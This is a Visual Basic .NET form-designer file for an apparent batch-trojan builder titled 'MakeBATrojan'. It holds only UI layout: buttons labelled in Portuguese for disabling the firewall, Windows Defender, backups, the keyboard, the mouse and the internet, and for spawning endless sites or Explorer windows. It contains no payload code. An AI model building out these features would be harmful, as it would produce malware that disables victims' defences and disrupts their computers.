<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits MetroFramework.Forms.MetroForm

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.mbDesligarPC = New MetroFramework.Controls.MetroButton
        Me.mtbNomeArquivo = New MetroFramework.Controls.MetroTextBox
        Me.mbReiniciarPC = New MetroFramework.Controls.MetroButton
        Me.mlStatus = New MetroFramework.Controls.MetroLabel
        Me.mbDesativarInternet = New MetroFramework.Controls.MetroButton
        Me.mbDesativarFirewall = New MetroFramework.Controls.MetroButton
        Me.mbDesativarMouse = New MetroFramework.Controls.MetroButton
        Me.mbDesativarTeclado = New MetroFramework.Controls.MetroButton
        Me.mbDesativarPesquisar = New MetroFramework.Controls.MetroButton
        Me.mbDesativarWindowsDefender = New MetroFramework.Controls.MetroButton
        Me.mbAbrirInfinitosSites = New MetroFramework.Controls.MetroButton
        Me.mbFinalizarExplorer = New MetroFramework.Controls.MetroButton
        Me.mbLogoff = New MetroFramework.Controls.MetroButton
        Me.mbInfinitosExplorer = New MetroFramework.Controls.MetroButton
        Me.mbDesativarBackup = New MetroFramework.Controls.MetroButton
        Me.SuspendLayout()
        '
        'mbDesligarPC
        '
        Me.mbDesligarPC.Location = New System.Drawing.Point(28, 63)
        Me.mbDesligarPC.Name = "mbDesligarPC"
        Me.mbDesligarPC.Size = New System.Drawing.Size(116, 33)
        Me.mbDesligarPC.TabIndex = 1
        Me.mbDesligarPC.Text = "Desligar PC"
        Me.mbDesligarPC.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesligarPC.UseSelectable = True
        '
        'mtbNomeArquivo
        '
        Me.mtbNomeArquivo.Lines = New String(-1) {}
        Me.mtbNomeArquivo.Location = New System.Drawing.Point(184, 29)
        Me.mtbNomeArquivo.MaxLength = 32767
        Me.mtbNomeArquivo.Name = "mtbNomeArquivo"
        Me.mtbNomeArquivo.PasswordChar = Global.Microsoft.VisualBasic.ChrW(0)
        Me.mtbNomeArquivo.PromptText = "Nome do Arquivo..."
        Me.mtbNomeArquivo.ScrollBars = System.Windows.Forms.ScrollBars.None
        Me.mtbNomeArquivo.SelectedText = ""
        Me.mtbNomeArquivo.Size = New System.Drawing.Size(332, 23)
        Me.mtbNomeArquivo.TabIndex = 19
        Me.mtbNomeArquivo.UseSelectable = True
        '
        'mbReiniciarPC
        '
        Me.mbReiniciarPC.Location = New System.Drawing.Point(150, 63)
        Me.mbReiniciarPC.Name = "mbReiniciarPC"
        Me.mbReiniciarPC.Size = New System.Drawing.Size(116, 33)
        Me.mbReiniciarPC.TabIndex = 2
        Me.mbReiniciarPC.Text = "Reiniciar PC"
        Me.mbReiniciarPC.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbReiniciarPC.UseSelectable = True
        '
        'mlStatus
        '
        Me.mlStatus.FontSize = MetroFramework.MetroLabelSize.Small
        Me.mlStatus.Location = New System.Drawing.Point(23, 383)
        Me.mlStatus.Name = "mlStatus"
        Me.mlStatus.Size = New System.Drawing.Size(493, 23)
        Me.mlStatus.TabIndex = 3
        Me.mlStatus.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        Me.mlStatus.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'mbDesativarInternet
        '
        Me.mbDesativarInternet.Location = New System.Drawing.Point(394, 63)
        Me.mbDesativarInternet.Name = "mbDesativarInternet"
        Me.mbDesativarInternet.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarInternet.TabIndex = 4
        Me.mbDesativarInternet.Text = "Desativar Internet"
        Me.mbDesativarInternet.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarInternet.UseSelectable = True
        '
        'mbDesativarFirewall
        '
        Me.mbDesativarFirewall.Location = New System.Drawing.Point(394, 102)
        Me.mbDesativarFirewall.Name = "mbDesativarFirewall"
        Me.mbDesativarFirewall.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarFirewall.TabIndex = 5
        Me.mbDesativarFirewall.Text = "Desativar Firewall"
        Me.mbDesativarFirewall.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarFirewall.UseSelectable = True
        '
        'mbDesativarMouse
        '
        Me.mbDesativarMouse.Location = New System.Drawing.Point(28, 102)
        Me.mbDesativarMouse.Name = "mbDesativarMouse"
        Me.mbDesativarMouse.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarMouse.TabIndex = 6
        Me.mbDesativarMouse.Text = "Desativar Mouse"
        Me.mbDesativarMouse.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarMouse.UseSelectable = True
        '
        'mbDesativarTeclado
        '
        Me.mbDesativarTeclado.Location = New System.Drawing.Point(150, 102)
        Me.mbDesativarTeclado.Name = "mbDesativarTeclado"
        Me.mbDesativarTeclado.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarTeclado.TabIndex = 7
        Me.mbDesativarTeclado.Text = "Desativar Teclado"
        Me.mbDesativarTeclado.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarTeclado.UseSelectable = True
        '
        'mbDesativarPesquisar
        '
        Me.mbDesativarPesquisar.Location = New System.Drawing.Point(272, 102)
        Me.mbDesativarPesquisar.Name = "mbDesativarPesquisar"
        Me.mbDesativarPesquisar.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarPesquisar.TabIndex = 8
        Me.mbDesativarPesquisar.Text = "Desativar Pesquisar"
        Me.mbDesativarPesquisar.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarPesquisar.UseSelectable = True
        '
        'mbDesativarWindowsDefender
        '
        Me.mbDesativarWindowsDefender.Location = New System.Drawing.Point(28, 141)
        Me.mbDesativarWindowsDefender.Name = "mbDesativarWindowsDefender"
        Me.mbDesativarWindowsDefender.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarWindowsDefender.TabIndex = 9
        Me.mbDesativarWindowsDefender.Text = "Win Defender Off"
        Me.mbDesativarWindowsDefender.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarWindowsDefender.UseSelectable = True
        '
        'mbAbrirInfinitosSites
        '
        Me.mbAbrirInfinitosSites.Location = New System.Drawing.Point(150, 141)
        Me.mbAbrirInfinitosSites.Name = "mbAbrirInfinitosSites"
        Me.mbAbrirInfinitosSites.Size = New System.Drawing.Size(116, 33)
        Me.mbAbrirInfinitosSites.TabIndex = 10
        Me.mbAbrirInfinitosSites.Text = "Infinitos Sites"
        Me.mbAbrirInfinitosSites.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbAbrirInfinitosSites.UseSelectable = True
        '
        'mbFinalizarExplorer
        '
        Me.mbFinalizarExplorer.Location = New System.Drawing.Point(394, 141)
        Me.mbFinalizarExplorer.Name = "mbFinalizarExplorer"
        Me.mbFinalizarExplorer.Size = New System.Drawing.Size(116, 33)
        Me.mbFinalizarExplorer.TabIndex = 11
        Me.mbFinalizarExplorer.Text = "Finalizar Explorer"
        Me.mbFinalizarExplorer.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbFinalizarExplorer.UseSelectable = True
        '
        'mbLogoff
        '
        Me.mbLogoff.Location = New System.Drawing.Point(272, 63)
        Me.mbLogoff.Name = "mbLogoff"
        Me.mbLogoff.Size = New System.Drawing.Size(116, 33)
        Me.mbLogoff.TabIndex = 12
        Me.mbLogoff.Text = "Logoff"
        Me.mbLogoff.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbLogoff.UseSelectable = True
        '
        'mbInfinitosExplorer
        '
        Me.mbInfinitosExplorer.Location = New System.Drawing.Point(28, 180)
        Me.mbInfinitosExplorer.Name = "mbInfinitosExplorer"
        Me.mbInfinitosExplorer.Size = New System.Drawing.Size(116, 33)
        Me.mbInfinitosExplorer.TabIndex = 13
        Me.mbInfinitosExplorer.Text = "Infinitos Explorer"
        Me.mbInfinitosExplorer.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbInfinitosExplorer.UseSelectable = True
        '
        'mbDesativarBackup
        '
        Me.mbDesativarBackup.Location = New System.Drawing.Point(272, 141)
        Me.mbDesativarBackup.Name = "mbDesativarBackup"
        Me.mbDesativarBackup.Size = New System.Drawing.Size(116, 33)
        Me.mbDesativarBackup.TabIndex = 14
        Me.mbDesativarBackup.Text = "Desativar Backup"
        Me.mbDesativarBackup.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.mbDesativarBackup.UseSelectable = True
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(539, 412)
        Me.Controls.Add(Me.mbDesativarBackup)
        Me.Controls.Add(Me.mbInfinitosExplorer)
        Me.Controls.Add(Me.mbLogoff)
        Me.Controls.Add(Me.mbFinalizarExplorer)
        Me.Controls.Add(Me.mbAbrirInfinitosSites)
        Me.Controls.Add(Me.mbDesativarWindowsDefender)
        Me.Controls.Add(Me.mbDesativarPesquisar)
        Me.Controls.Add(Me.mbDesativarTeclado)
        Me.Controls.Add(Me.mbDesativarMouse)
        Me.Controls.Add(Me.mbDesativarFirewall)
        Me.Controls.Add(Me.mbDesativarInternet)
        Me.Controls.Add(Me.mlStatus)
        Me.Controls.Add(Me.mbReiniciarPC)
        Me.Controls.Add(Me.mtbNomeArquivo)
        Me.Controls.Add(Me.mbDesligarPC)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.Resizable = False
        Me.ShadowType = MetroFramework.Forms.MetroFormShadowType.None
        Me.Style = MetroFramework.MetroColorStyle.Silver
        Me.Text = "MakeBATrojan"
        Me.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents mbDesligarPC As MetroFramework.Controls.MetroButton
    Friend WithEvents mtbNomeArquivo As MetroFramework.Controls.MetroTextBox
    Friend WithEvents mbReiniciarPC As MetroFramework.Controls.MetroButton
    Friend WithEvents mlStatus As MetroFramework.Controls.MetroLabel
    Friend WithEvents mbDesativarInternet As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarFirewall As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarMouse As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarTeclado As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarPesquisar As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarWindowsDefender As MetroFramework.Controls.MetroButton
    Friend WithEvents mbAbrirInfinitosSites As MetroFramework.Controls.MetroButton
    Friend WithEvents mbFinalizarExplorer As MetroFramework.Controls.MetroButton
    Friend WithEvents mbLogoff As MetroFramework.Controls.MetroButton
    Friend WithEvents mbInfinitosExplorer As MetroFramework.Controls.MetroButton
    Friend WithEvents mbDesativarBackup As MetroFramework.Controls.MetroButton

End Class
